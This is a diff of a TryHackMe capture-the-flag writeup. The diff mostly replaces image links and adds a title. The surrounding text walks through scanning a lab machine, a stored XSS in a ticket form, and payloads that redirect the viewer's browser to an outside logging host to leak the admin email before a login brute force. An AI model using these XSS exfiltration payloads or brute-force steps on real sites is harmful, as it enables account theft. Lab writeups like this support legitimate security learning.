@@ -6,6 +6,8 @@ tags: [tryhackme, ctf-writeup]
 read_time: "9 min read"
 ---
 
+# That's The Ticket Writeup - TryHackMe
+
 ## IT Support are going to have a bad day, can you get into the admin account?
 
 Happy New Year’s! Few days before the end of 2024 I sat down to take on my final challenge of the year, this time going with a medium level room. This one has been sitting in my saved rooms for a while and I really wanted to give it a try. This room consisted of challenging the users understanding of XSS, HTTP and DNS logging, and how to brute force a login page to be able to complete it. It was a lot of fun but also quite challenging, as well as a great opportunity to practice some skills I learned previously in school. I hope you enjoy the writeup and walkthrough, and if you’re currently working through the room, I hope this is helpful.
@@ -16,21 +18,21 @@ Happy New Year’s! Few days before the end of 2024 I sat down to take on my fin
 
 Like I do with any challenge, I started off by pinging the machine and running an Nmap scan using the command, `nmap -sV -T4 10.10.154.106`. -sV is used for service detection and -T4 is used for timing, it’s fast but maintains reasonable accuracy of the scan. The results of the scan came back showing port 22 and port 80 both being open.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735785003329/e4a62a65-bb63-4f84-aefd-7e887415d3dc.png align="center")
+![](/assets/images/ticketPic1.png)
 
 For the room being related to presumably a ticket system, it made sense in having port 80 open, so from here I searched the IP address in my browser. This did in fact direct me to a Ticket Manager homepage. On this page there were only two options of where to go next, a login page and a register page. This page was very simple and didn’t have much on it.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735785206034/04fb5b39-9ec5-4ab7-89df-19d8c01cc9ba.png align="center")
+![](/assets/images/ticketPic2.png)
 
 Before continuing to investigate the website, I started running gobuster using the command, `gobuster dir -u` [`http://10.10.154.106`](http://10.10.154.106) `-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`. Through the entire time of it running it kept returning results of directories with the name of numbers with the status code 302. There were a few with the status 200 within the first 25% but those were for the login and register pages, which were to be expected because of what we could see on the homepage.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735786442300/4c6eed08-b65d-41a1-a354-5a3a8fecfe4f.png align="center")
+![](/assets/images/ticketPic3.png)
 
 Back on the website before checking out more of what I could see in plain sight, I skimmed through the page source to look for any possible hidden information that might reveal tips or hints for solving the room. I didn’t find anything useful here, so I just moved onto checking out the login and register pages. They also looked quite simple like the homepage and nothing looked out of place or suspicious in the source code. I quickly registered for the site, which then directed me to the dashboard. Again, the style and look of the site was very similar to the previous pages we have seen.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735786566594/aa73f697-a8f6-49ef-acfb-2b63f5653bac.png align="center")
+![](/assets/images/ticketPic4.png)
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735786571609/86343821-5cfc-46c5-926b-6b6615c70965.png align="center")
+![](/assets/images/ticketPic5.png)
 
 ## Active Enumeration
 
@@ -45,15 +47,15 @@ Seeing that the dashboard included a text area immediately made me think of test
 
 The first one was more of a simple test, and if that one didn’t work I would move onto the other two which were an attempt to bypass any filters in the code. Unfortunately none of them worked so I went back to the first ticket to see how the website looked in response to the payload and to see how the source code handled it.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735787082307/2cc15623-6b42-481d-9c0c-e4a70d73026d.png align="center")
+![](/assets/images/ticketPic6.png)
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735787506752/b2ce14fc-cf2a-461b-8c94-708c7482a557.png align="center")
+![](/assets/images/ticketPic7.png)
 
 The ticket itself held nothing special but the source code revealed how the text area is handled, meaning just a little bit of tweaking to that first payload could successfully exploit the vulnerability. By adding `</textarea>` to the beginning of the payload closed the initial text area tag allowing for the alert tag to be triggered. Submitting the updated payload gave us the alert and looking at the source code of that tickets page showed us what we were expecting to see.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735787164941/6543824a-d9fa-4c9c-b549-15276ea66e4f.png align="center")
+![](/assets/images/ticketPic8.png)
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735788108187/7ddec15b-606d-4fa1-ae70-7ec4553d8d3c.png align="center")
+![](/assets/images/ticketPic85.png)
 
 ## Exploitation
 
@@ -61,7 +63,7 @@ Being able to trigger that alert is very important for moving forward, now we kn
 
 Tweaking the above command to combine the request catchers’ domain will hopefully get us some output on the catcher page. The first payload I tried was, `</textarea><img src=”http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech”>`. It didn’t look like it had worked as I wasn’t getting anything in the request catcher site so I adjusted the payload to, `</textarea><img src=x onerror=”location=’http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech/’”>`, which did give me some output.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735789143261/f6c7b204-2aa9-46f8-9643-65251f798243.png align="center")
+![](/assets/images/ticketPic9.png)
 
 Successfully getting an output here means we can move onto find useful information like the email address for the IT Support which is the first question of the room. The first payload I tried returned the test email I used to signup but it looked to have replaced the @ symbol with the string %40.
 
@@ -74,7 +76,7 @@ Successfully getting an output here means we can move onto find useful informati
 </script>
 ```
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735790139704/6f5fa44b-1c1a-4b16-b0f2-008429d3a4ac.png align="center")
+![](/assets/images/ticketPic10.png)
 
 Changing the above payload to look something like below to filter out the test email also didn’t work. From there I changed the URL to try a subdomain and then merge the two in a couple different ways but it still wasn’t really working, so I moved onto trying a different payload.
 
@@ -110,7 +112,7 @@ I realized I was probably making my payloads for this way too complex so I went 
 </script>
 ```
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735791075253/e1e8e769-28b6-4359-9b77-cb60df5404ec.png align="center")
+![](/assets/images/ticketPic11.png)
 
 Once I found the admin email, there wasn’t too much more work to do besides brute forcing the login page to find the IT supports’ password and then using it to find the flag in the first ticket. For brute forcing the email to get the accounts password you can ether use tools like Hydra, Burpsuite, or WFuzz, or you can write or find a python script that automates that process.
 
@@ -158,7 +160,7 @@ P.S. if you’re interested in seeing more scripts I make or find, I’ve starte
 
 After running it a few times and troubleshooting a few spelling errors, it takes a few seconds to run but it spits out the password for the email. This is the answer to the second question of the room. Then taking that password and plugging it into the login page along with the supports’ email, gives us access to the account. Lastly we can view the first ticket, giving us the flag and the final answer of the challenge.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735797117830/80e00b5b-9133-4209-aef2-404f739d130c.png align="center")
+![](/assets/images/ticketPic12.png)
 
 ---
 
@@ -166,7 +168,7 @@ After running it a few times and troubleshooting a few spelling errors, it takes
 
 When I first got to the website used for this challenge, before investigating further into it, I skimmed through the page source to look for any possible hidden information for the room. I didn’t find anything useful here and what I did find held no importance to the task at hand, but I thought it was pretty interesting as I have never seen anything like it.
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1735785511176/3cf48072-5f07-4787-ad0b-e2360b6a4413.png align="center")
+![](/assets/images/ticketPic13.png)
 
 In the head section of HTML source code, in the link tag, there is an attribute called, integrity. Looking into this, I found out it is a security feature used by web developers to ensure the resource hasn't been tampered with and is part of a feature called Subresource Integrity (SRI). Anyone who has worked more with websites or has more experience with pentesting, most likely has seen this before, but this was the first I have ever noticed this attribute in a websites source code and it caught my eye.
 
